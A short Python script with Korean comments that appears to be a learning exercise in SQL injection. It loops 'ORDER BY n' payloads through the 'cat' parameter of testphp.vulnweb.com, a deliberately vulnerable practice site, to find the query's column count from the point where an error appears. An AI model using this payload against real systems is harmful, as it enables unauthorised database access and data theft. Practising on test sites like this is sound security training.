import requests

# ?cat=1 을 뺍니다. (params에 넣을 거니까요)
base_url = 'http://testphp.vulnweb.com/listproducts.php'

print("컬럼 개수 파악(ORDER BY) 공격 - params 정석 방식")

for i in range(1, 21):
    # [핵심] 문자열 합치기가 아니라, 딕셔너리로 데이터를 만듭니다.
    # 파이썬이 알아서 공백을 처리해줍니다.
    my_params = {'cat': f"1 ORDER BY {i}"}
    
    # params 옵션을 사용하면 자동으로 URL을 예쁘게 포장해줍니다.
    res = requests.get(base_url, params=my_params)
    
    length = len(res.text)
    
    # 정상일 때(1~3번)와 에러일 때(4번~)의 글자 수가 다를 겁니다.
    # 7880 근처면 정상, 확 줄어들거나 늘어나면 에러입니다.
    print(f"[시도 {i}] payload: {res.url}") # 실제로 날아가는 주소를 눈으로 확인
    print(f" -> 결과 글자수: {length}")

    if "Error" in res.text:
         print(f"\n[★] 정답 발견! {i}번에서 에러가 났으므로, 컬럼은 {i-1}개입니다!")
         break